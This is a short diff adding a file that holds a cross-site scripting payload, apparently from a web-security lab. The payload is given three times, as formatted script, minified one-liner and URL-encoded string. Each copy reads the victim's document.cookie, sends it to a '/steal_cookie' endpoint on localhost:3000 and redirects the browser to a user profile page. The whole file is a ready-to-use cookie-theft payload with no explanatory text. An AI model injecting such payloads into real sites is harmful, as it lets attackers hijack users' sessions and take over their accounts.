@@ -1,0 +1,12 @@
+<script>
+var req = new XMLHttpRequest();
+var cookie = document.cookie.split(';')[1];
+req.open('GET', 'http://localhost:3000/steal_cookie?cookie=' + cookie,false);
+req.send();
+window.location='http://localhost:3000/profile?username=user1';
+</script>
+
+<script>var req = new XMLHttpRequest();var cookie = document.cookie.split(';')[1];req.open('GET', 'http://localhost:3000/steal_cookie?cookie=' + cookie,false);req.send();window.location='http://localhost:3000/profile?username=user1';</script>
+
+
+<script>var+req+%3D+new+XMLHttpRequest()%3Bvar+cookie+%3D+document.cookie.split('%3B')[1]%3Breq.open('GET'%2C+'http%3A%2F%2Flocalhost%3A3000%2Fsteal_cookie%3Fcookie%3D'+%2B+cookie%2Cfalse)%3Breq.send()%3Bwindow.location%3D'http%3A%2F%2Flocalhost%3A3000%2Fprofile%3Fusername%3Duser1'%3B<%2Fscript>
